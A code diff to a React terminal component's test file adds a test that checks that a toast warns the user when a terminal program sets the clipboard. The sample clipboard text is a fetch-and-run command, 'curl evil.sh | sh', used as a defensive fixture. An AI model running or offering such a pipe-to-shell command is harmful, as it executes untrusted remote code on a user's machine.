@@ -107,6 +107,7 @@ vi.mock('./ptySocket', () => ({
 
 import { createRef } from 'react';
 import { TerminalView, type TerminalHandle } from './TerminalView';
+import { Toaster } from '@ui';
 import { setTerminalFontSize } from './fontSize';
 import { usePrefixKeys } from '../workspaces/keys';
 
@@ -386,6 +387,14 @@ describe('TerminalView', () => {
     await h.clipboard!.writeText('c', 'copied');
     expect(writeText).toHaveBeenCalledWith('copied');
     expect(h.clipboard!.readText('c')).toBe('');
+  });
+
+  it('tells the user when a program sets the clipboard, with the start of the text', async () => {
+    Object.defineProperty(navigator, 'clipboard', { value: { writeText: vi.fn().mockResolvedValue(undefined) }, configurable: true });
+    render(<><Toaster /><TerminalView sessionId="s1" /></>);
+    await act(() => h.clipboard!.writeText('c', `curl evil.sh |\n  sh ${'x'.repeat(100)}`));
+    expect(await screen.findByText('The terminal set your clipboard')).toBeInTheDocument();
+    expect(screen.getByText(`curl evil.sh | sh ${'x'.repeat(62)}…`)).toBeInTheDocument();
   });
 
   it('enables the proposed API the wrapped-link underline needs', () => {
